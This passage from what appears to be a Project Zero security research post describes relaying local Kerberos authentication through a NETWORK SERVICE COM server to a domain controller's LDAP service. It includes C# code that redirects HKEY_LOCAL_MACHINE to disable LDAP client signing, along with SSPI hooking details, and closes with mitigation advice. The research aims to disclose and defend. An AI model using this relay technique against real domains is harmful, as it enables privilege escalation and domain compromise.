 <p class="c0"><span class="c9"></span></p>
 <p class="c5"></p>
  
 <p class="c5"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiooNt9vGeuuGX-qWowAPJv7twW2ASFXiXwvwVb9QQimr6U2WnzYWPcRQKHXDdnn8mXuNaC0l0Fvs9fvHbYbh72r4G2_AnCLjaVC2HtnzoL2sgb8hOiw-EJyldnejADOu8ddBamYLMOP0d-Km3g1HX02MOhi033j7usXaJJ8MeSHKWJBK4C3gcY426H/s877/image1%20%286%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiooNt9vGeuuGX-qWowAPJv7twW2ASFXiXwvwVb9QQimr6U2WnzYWPcRQKHXDdnn8mXuNaC0l0Fvs9fvHbYbh72r4G2_AnCLjaVC2HtnzoL2sgb8hOiw-EJyldnejADOu8ddBamYLMOP0d-Km3g1HX02MOhi033j7usXaJJ8MeSHKWJBK4C3gcY426H/s877/image1%20%286%29.png" border="0" alt="Screenshot of the Registry Editor showing HKLM\SOFTWARE\Microsoft\Rpc\SecurityService key" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The key, shown in the above screenshot has a list of values. The value&#39;s name is the number </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/com/com-authentication-service-constants">assigned</a></span><span>&nbsp;to the authentication service, for example 16 is </span><span class="c4">RPC_C_AUTHN_GSS_KERBEROS</span><span>. The value&#39;s data is then the name of the DLL to load which provides the API, for Kerberos this is </span><span class="c4">sspicli.dll</span><span class="c9">.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The RPC runtime then loads a table of security functions from the DLL by calling its exported </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initsecurityinterfacew">InitSecurityInterface</a></span><span>&nbsp;method. At least for </span><span class="c4">sspicli</span><span>&nbsp;the table is always the same and is a pre-initialized structure in the DLL&#39;s data section. This is perfect, we can just call </span><span class="c4">InitSecurityInterface</span><span class="c9">&nbsp;before the RPC runtime is initialized to get a pointer to the table then modify its function pointers to point to our own implementation of the API. As an added bonus the table is in a writable section of the DLL so we don&#39;t even need to modify the memory protection.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Of course implementing the hooks is non-trivial. This is made more complex because RPC uses the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/190ab8de-dc42-49cf-bf1b-ea5705b7a087">DCE style Kerberos authentication</a></span><span class="c9">&nbsp;which requires two tokens from the client before the server considers the authentication complete. This requires maintaining more state to keep the RPC server and client implementations happy. I&#39;ll leave this as an exercise for the reader.</span></p><h2 class="c23" id="h.dkczv6jimbo9"><span class="c25 c17">Choosing a Relay Target Service</span></h2>
 <p class="c5"><span>The next step is to choose a suitable target service to relay the authentication to. For </span><span class="c2"><a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325">issue 325</a></span><span class="c9">&nbsp;I relayed the authentication to the same machine&#39;s DCOM activator RPC service and was able to achieve an arbitrary file write.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>I thought that maybe I could do so again, so I modified my </span><span class="c2"><a class="c211" href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">.NET RPC client</a></span><span class="c9">&nbsp;to handle the relayed authentication and tried accessing local RPC services. No matter what RPC server or function I called, I always got an access denied error. Even if I wrote my own RPC server which didn&#39;t have any checks, it would fail.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Digging into the failure it turned out that at some point (I don&#39;t know specifically when), Microsoft added a mitigation into the RPC runtime to make it very difficult to relay authentication back to the same system. </span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.d16597b280dba3c3840bf804233cdcf3fbce3cb7"></a><a id="t.8"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c10">void</span><span class="c11">&nbsp;SSECURITY_CONTEXT</span><span class="c3">::</span><span class="c11">ValidateUpgradeCriteria</span><span class="c3 c17">() {</span></p>
 <p class="c1"><span class="c11">&nbsp; </span><span class="c16 c13">if</span><span class="c11">&nbsp;</span><span class="c3">(</span><span class="c16 c13">this</span><span class="c3">-&gt;</span><span class="c11">AuthnLevel </span><span class="c3">&lt;</span><span class="c11">&nbsp;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</span><span class="c3 c17">) {</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; </span><span class="c16 c13">if</span><span class="c11">&nbsp;</span><span class="c3">(</span><span class="c11">IsLoopback</span><span class="c3 c17">())</span></p>
 <p class="c1"><span class="c11">&nbsp; &nbsp; &nbsp; </span><span class="c16 c13">this</span><span class="c3">-&gt;</span><span class="c11">UnsafeLoopbackAuth </span><span class="c3">=</span><span class="c11">&nbsp;TRUE</span><span class="c3 c17">;</span></p>
 <p class="c1"><span class="c11">&nbsp; </span><span class="c3 c17">}</span></p>
 <p class="c1"><span class="c3">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The </span><span class="c4">SSECURITY_CONTEXT::ValidateUpgradeCriteria</span><span>&nbsp;method is called when receiving RPC authentication packets. If the authentication level for the RPC connection is less than </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</span><span>&nbsp;such as </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_CONNECT</span><span>&nbsp;and the authentication was from the same system then a flag is set to true in the security context. The </span><span class="c4">IsLoopback </span><span>function calls the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/querycontextattributes--general">QueryContextAttributes</a></span><span>&nbsp;API for the undocumented </span><span class="c4">SECPKG_ATTR_IS_LOOPBACK</span><span class="c9">&nbsp;attribute value from the server security context. This attribute indicates if the authentication was from the local system.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>When an RPC call is made the server will check if the flag is true, if it is then the call will be immediately rejected before any code is called in the server including the RPC interface&#39;s security callback. The only way to pass this check is either the authentication doesn&#39;t come from the local system or the authentication level is </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</span><span class="c9">&nbsp;or above which then requires the client to know the session key for signing or encryption. The RPC client will also check for local authentication and will increase the authentication level if necessary. This is an effective way of preventing the relay of local authentication to elevate privileges.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span class="c9">Instead as I was focussing on Kerberos, I came to the conclusion that relaying the authentication to an enterprise network service was more useful. As the default settings for a domain controller&#39;s LDAP service still do not enforce signing, it would seem a reasonable target. As we&#39;ll see, this provides a limitation of the source of the authentication, as it must not enable Integrity otherwise the LDAP server will enforce signing.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The problem with LDAP is I didn&#39;t have any code which implemented the protocol. I&#39;m sure there is some .NET code to do it somewhere, but the fewer dependencies I have the better. As I mentioned in the </span><span class="c2"><a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">previous blog post</a></span><span>, Windows has a builtin </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/_ldap/">LDAP library</a></span><span>&nbsp;in </span><span class="c4">wldap32.dll</span><span class="c9">. Could I repurpose its API but convert it into using relayed authentication?</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Unsurprisingly the library doesn&#39;t have a &quot;Enable relayed authentication&quot; mode, but after a few minutes in a disassembler, it was clear it was also delay-loading the SSPI interfaces through the </span><span class="c4">InitSecurityInterface </span><span>method. I could repurpose my code for capturing the authentication for relaying the authentication. There was initially a minor issue, accidentally or on purpose there was a stray call to </span><span class="c4">QueryContextAttributes</span><span class="c4">&nbsp;</span><span>which was directly imported, so I needed to patch that through an </span><span class="c4">Import Address Table (IAT)</span><span class="c9">&nbsp;hook as distasteful as that was.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>There was still a problem however. When the client connects it always tries to enable LDAP signing, as we are relaying authentication with no access to the session key this causes the connection to fail. Setting the option value </span><span class="c4">LDAP_OPT_SIGN</span><span>&nbsp;in the library to false didn&#39;t change this behavior. I needed to set the </span><span class="c4">LdapClientIntegrity </span><span>registry value to 0 in the LDAP service&#39;s key before initializing the library. Unfortunately that key is only modifiable by administrators. I could have modified the library itself, but as it was checking the key during </span><span class="c4">DllMain </span><span class="c9">it would be a complex dance to patch the DLL in the middle of loading.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>Instead I decided to override the </span><span class="c4">HKEY_LOCAL_MACHINE</span><span>&nbsp;key. This is possible for the Win32 APIs by using the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regoverridepredefkey">RegOverridePredefKey</a></span><span>&nbsp;API. The purpose of the API is to allow installers to redirect administrator-only modifications to the registry into a writable location, however for our purposes we can also use it to redirect the reading of the </span><span class="c4">LdapClientIntegrity </span><span class="c9">registry value.</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.701cb52d2a1d8adec608337c8e749b549cee1cf3"></a><a id="t.9"></a><table class="c20"><tbody><tr class="c26"><td class="c31" colspan="1" rowspan="1">
 <p class="c1"><span class="c12">[DllImport(</span><span class="c12 c27">&quot;Advapi32.dll&quot;</span><span class="c6">)]</span></p>
 <p class="c1"><span class="c12 c13">static</span><span class="c12">&nbsp;</span><span class="c12 c13">extern</span><span class="c12">&nbsp;</span><span class="c12 c13">int</span><span class="c6">&nbsp;RegOverridePredefKey(</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; IntPtr hKey,</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; IntPtr hNewHKey</span></p>
 <p class="c1"><span class="c6">);</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12">[DllImport(</span><span class="c12 c27">&quot;kernel32.dll&quot;</span><span class="c12">, CharSet = CharSet.Unicode, SetLastError = </span><span class="c12 c13">true</span><span class="c6">)]</span></p>
 <p class="c1"><span class="c12 c13">static</span><span class="c12">&nbsp;</span><span class="c12 c13">extern</span><span class="c12">&nbsp;IntPtr LoadLibrary(</span><span class="c12 c13">string</span><span class="c6">&nbsp;libname);</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12 c13">static</span><span class="c12">&nbsp;</span><span class="c12 c13">readonly</span><span class="c12">&nbsp;IntPtr HKEY_LOCAL_MACHINE = </span><span class="c12 c13">new</span><span class="c6">&nbsp;IntPtr(-2147483646);</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12 c13">static</span><span class="c12">&nbsp;</span><span class="c12 c13">void</span><span class="c6">&nbsp;OverrideLocalMachine(RegistryKey key)</span></p>
 <p class="c1"><span class="c6">{</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c13">int</span><span class="c6">&nbsp;res = RegOverridePredefKey(HKEY_LOCAL_MACHINE, </span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; key?.Handle.DangerousGetHandle() ?? IntPtr.Zero);</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c13">if</span><span class="c6">&nbsp;(res != 0)</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c13">throw</span><span class="c12">&nbsp;</span><span class="c12 c13">new</span><span class="c6">&nbsp;Win32Exception(res);</span></p>
 <p class="c1"><span class="c6">}</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12 c13">static</span><span class="c12">&nbsp;</span><span class="c12 c13">void</span><span class="c6">&nbsp;LoadLDAPLibrary()</span></p>
 <p class="c1"><span class="c6">{</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c13">string</span><span class="c12">&nbsp;dummy = </span><span class="c12 c15">@&quot;SOFTWARE\DUMMY&quot;</span><span class="c6">;</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c13">string</span><span class="c12">&nbsp;target = </span><span class="c12 c15">@&quot;System\CurrentControlSet\Services\LDAP&quot;</span><span class="c6">;</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; </span><span class="c12 c13">using</span><span class="c12">&nbsp;(</span><span class="c12 c13">var</span><span class="c12">&nbsp;key = Registry.CurrentUser.CreateSubKey(dummy, </span><span class="c12 c13">true</span><span class="c6">))</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; {</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c13">using</span><span class="c12">&nbsp;(</span><span class="c12 c13">var</span><span class="c12">&nbsp;okey = key.CreateSubKey(target, </span><span class="c12 c13">true</span><span class="c6">))</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; {</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; okey.SetValue(</span><span class="c12 c27">&quot;LdapClientIntegrity&quot;</span><span class="c6">, 0, </span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RegistryValueKind.DWord);</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OverrideLocalMachine(key);</span></p>
 <p class="c1 c19"><span class="c6"></span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c17 c13">try</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IntPtr lib = LoadLibrary(</span><span class="c12 c27">&quot;wldap32.dll&quot;</span><span class="c6">);</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c13">if</span><span class="c6">&nbsp;(lib == IntPtr.Zero)</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c13">throw</span><span class="c12">&nbsp;</span><span class="c12 c13">new</span><span class="c6">&nbsp;Win32Exception();</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c12 c17 c13">finally</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span></p>
 <p class="c1"><span class="c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; OverrideLocalMachine(</span><span class="c12 c13">null</span><span class="c6">);</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Registry.CurrentUser.DeleteSubKeyTree(dummy);</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; &nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c6">&nbsp; &nbsp; }</span></p>
 <p class="c1"><span class="c12">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This code redirects the </span><span class="c4">HKEY_LOCAL_MACHINE</span><span class="c9">&nbsp;key and then loads the LDAP library. Once it&#39;s loaded we can then revert the override so that everything else works as expected. We can now repurpose the built-in LDAP library to relay Kerberos authentication to the domain controller. For the final step, we need a privileged COM service to unmarshal the OBJREF to start the process.</span></p><h2 class="c23" id="h.dwt9lb67za71"><span class="c25 c17">Choosing a COM Unmarshaller </span></h2>
 <p class="c5"><span>The </span><span class="c4">RemotePotato </span><span>attack assumes that a more privileged user is authenticated on the same machine. However I wanted to see what I could do </span><span class="c4">without</span><span class="c9">&nbsp;that requirement. Realistically the only thing that can be done is to relay the computer&#39;s domain account to the LDAP server. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>To get access to authentication for the computer account, we need to unmarshal the OBJREF inside a process running as either </span><span class="c4">SYSTEM</span><span>&nbsp;or </span><span class="c4">NETWORK SERVICE</span><span class="c9">. These local accounts are mapped to the computer account when authenticating to another machine on the network. </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>We do have one big limitation on the selection of a suitable COM server: it must make the RPC connection using the </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_CONNECT</span><span>&nbsp;authentication level. Anything above that will enable Integrity on the authentication which will prevent us relaying to LDAP. Fortunately </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_CONNECT</span><span>&nbsp;is the default setting for DCOM, but unfortunately all services which use the </span><span class="c4">svchost </span><span>process change that default to </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT</span><span class="c9">&nbsp;which enables Integrity.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>After a bit of hunting around with </span><span class="c2"><a class="c211" href="http://oleview.net">OleViewDotNet</a></span><span>, I found a good candidate class, </span><span class="c4">CRemoteAppLifetimeManager</span><span>&nbsp;(CLSID: 0bae55fc-479f-45c2-972e-e951be72c0c1) which is hosted in its own executable, runs as </span><span class="c4">NETWORK SERVICE</span><span class="c9">, and doesn&#39;t change any default settings as shown below.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"></p>
  
 <p class="c5"><span class="c4"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY0GTONUmsfjcV_gBc77i0Cvy_4WgZ_89837ArCqW3GfvyXBsIinDGdcZxxo5Sj6WWjTd0DsNFt7O95UMjb_-QiwHrzdvJo3y9HWH6oxQVnBeKjwLUqnVGmwh9kqOsvM9YfZsIiSgCdX3io1tg31NwkHUMfS3KTEGoJxbRrtC15Z5n72WuCSS92zOb/s945/image3%20%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY0GTONUmsfjcV_gBc77i0Cvy_4WgZ_89837ArCqW3GfvyXBsIinDGdcZxxo5Sj6WWjTd0DsNFt7O95UMjb_-QiwHrzdvJo3y9HWH6oxQVnBeKjwLUqnVGmwh9kqOsvM9YfZsIiSgCdX3io1tg31NwkHUMfS3KTEGoJxbRrtC15Z5n72WuCSS92zOb/s945/image3%20%283%29.png" border="0" alt="Screenshot of the OleViewDotNet showing the security flags of the CRemoteAppLifetimeManager COM server" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>The server doesn&#39;t change the default impersonation level from </span><span class="c4">RPC_C_IMP_LEVEL_IDENTIFY</span><span>, which means the negotiated token will only be at </span><span class="c4">SecurityIdentification</span><span>&nbsp;level. For LDAP, this doesn&#39;t matter as it only uses the token for access checking, not to open resources. However, this would prevent using the same authentication to access something like the SMB server. I&#39;m confident that given enough effort, a COM server with both </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_CONNECT</span><span>&nbsp;and </span><span class="c4">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="c9">&nbsp;could be found, but it wasn&#39;t necessary for my exploit.</span></p><h2 class="c23" id="h.38szqoyv0vag"><span class="c25 c17">Wrapping Up</span></h2>
 <p class="c5"><span>That&#39;s a somewhat complex exploit. However, it does allow for authentication relay, with arbitrary Kerberos tokens from a local user to LDAP on a default Windows 10 system. Hopefully it might provide some ideas of how to implement something similar without always needing to write your protocol servers and clients and just use what&#39;s already available.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>This exploit is very similar to the existing RemotePotato exploit that Microsoft have already stated will not be fixed. This is because Microsoft considers authentication relay attacks to be an issue with the configuration of the Windows network, such as not enforcing signing on LDAP, rather than the particular technique used to generate the authentication relay. As I mentioned in the </span><span class="c2"><a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">previous blog post</a></span><span class="c9">, at most this would be assessed as a Moderate severity issue which does not reach the bar for fixing as part of regular updates (or potentially, not being fixed at all).</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>As for mitigating this issue without it being fixed by Microsoft, a system administrator should follow Microsoft&#39;s recommendations to enable signing and/or encryption on any sensitive service in the domain, especially LDAP. They can also enable Extended Protection for Authentication where the service is protected by TLS. They can also configure the </span><span class="c2"><a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/com/setting-machine-wide-security-using-dcomcnfg#setting-system-wide-default-authentication-level">default DCOM authentication level</a></span><span>&nbsp;to be </span><span class="c4">RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</span><span class="c9">&nbsp;or above. These changes would make the relay of Kerberos, or NTLM significantly less useful.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/5634534606665421566/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html
## @title
Windows Exploitation Tricks: Relaying DCOM Authentication
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s72-c/image2%20%285%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-6510029969921067809
## published
20/10/2021 13:26:00
## updated
21/10/2021 13:00:10
## title
## @type
text
## #text
Using Kerberos for Authentication Relay Attacks
## content
## @type
html
## #text
<style type="text/css">ol.lst-kix_d25vxsk234hv-6{list-style-type:none}.lst-kix_wkcrlfh2qk3l-7>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-7}.lst-kix_i2wckd3yhfhe-0>li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-0}ol.lst-kix_i2wckd3yhfhe-5.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-5 0}ol.lst-kix_d25vxsk234hv-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-4{list-style-type:none}ol.lst-kix_jp16emg17n48-2.start{counter-reset:lst-ctn-kix_jp16emg17n48-2 0}ol.lst-kix_d25vxsk234hv-3{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-8{list-style-type:none}ol.lst-kix_d25vxsk234hv-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-3.start{counter-reset:lst-ctn-kix_d25vxsk234hv-3 0}ol.lst-kix_d25vxsk234hv-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-0{list-style-type:none}.lst-kix_d25vxsk234hv-4>li{counter-increment:lst-ctn-kix_d25vxsk234hv-4}.lst-kix_jp16emg17n48-8>li{counter-increment:lst-ctn-kix_jp16emg17n48-8}ul.lst-kix_fmj6vk2ylkib-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-6.start{counter-reset:lst-ctn-kix_d25vxsk234hv-6 0}ol.lst-kix_i2wckd3yhfhe-4{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-8{list-style-type:none}.lst-kix_wkcrlfh2qk3l-8>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-8}ol.lst-kix_i2wckd3yhfhe-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-6{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-6{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-7{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-7{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-1{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-2{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-2{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-3{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-3{list-style-type:none}.lst-kix_2yktnm17nyl7-2>li:before{content:"\0025a0  "}.lst-kix_2yktnm17nyl7-3>li:before{content:"\0025cf  "}ul.lst-kix_2yktnm17nyl7-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-7{list-style-type:none}ul.lst-kix_2yktnm17nyl7-6{list-style-type:none}.lst-kix_d25vxsk234hv-2>li{counter-increment:lst-ctn-kix_d25vxsk234hv-2}.lst-kix_2yktnm17nyl7-1>li:before{content:"\0025cb  "}.lst-kix_d25vxsk234hv-5>li{counter-increment:lst-ctn-kix_d25vxsk234hv-5}.lst-kix_jp16emg17n48-7>li{counter-increment:lst-ctn-kix_jp16emg17n48-7}ol.lst-kix_jp16emg17n48-8.start{counter-reset:lst-ctn-kix_jp16emg17n48-8 0}ol.lst-kix_d25vxsk234hv-0.start{counter-reset:lst-ctn-kix_d25vxsk234hv-0 0}.lst-kix_2yktnm17nyl7-0>li:before{content:"\0025cf  "}.lst-kix_jp16emg17n48-4>li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-4,lower-latin) ") "}ol.lst-kix_wkcrlfh2qk3l-6.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-6 0}.lst-kix_jp16emg17n48-3>li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-3,decimal) ") "}.lst-kix_jp16emg17n48-5>li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-5,lower-roman) ") "}ul.lst-kix_2yktnm17nyl7-1{list-style-type:none}.lst-kix_jp16emg17n48-0>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-0,decimal) ") "}ul.lst-kix_2yktnm17nyl7-0{list-style-type:none}.lst-kix_jp16emg17n48-1>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-1,lower-latin) ") "}ul.lst-kix_2yktnm17nyl7-5{list-style-type:none}.lst-kix_jp16emg17n48-2>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-2,lower-roman) ") "}.lst-kix_wkcrlfh2qk3l-6>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-6}ul.lst-kix_2yktnm17nyl7-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-0 0}ol.lst-kix_jp16emg17n48-5.start{counter-reset:lst-ctn-kix_jp16emg17n48-5 0}ul.lst-kix_2yktnm17nyl7-3{list-style-type:none}ol.lst-kix_d25vxsk234hv-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-7{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-3.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-3 0}.lst-kix_jp16emg17n48-0>li{counter-increment:lst-ctn-kix_jp16emg17n48-0}.lst-kix_jp16emg17n48-7>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-7,lower-latin) ". "}ol.lst-kix_i2wckd3yhfhe-3.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-3 0}.lst-kix_jp16emg17n48-6>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-6,decimal) ". "}ol.lst-kix_i2wckd3yhfhe-7.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-7 0}.lst-kix_jp16emg17n48-6>li{counter-increment:lst-ctn-kix_jp16emg17n48-6}.lst-kix_wkcrlfh2qk3l-5>li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-5}ol.lst-kix_jp16emg17n48-4.start{counter-reset:lst-ctn-kix_jp16emg17n48-4 0}.lst-kix_jp16emg17n48-8>li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-8,lower-roman) ". "}ol.lst-kix_jp16emg17n48-3.start{counter-reset:lst-ctn-kix_jp16emg17n48-3 0}ol.lst-kix_wkcrlfh2qk3l-4.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-4 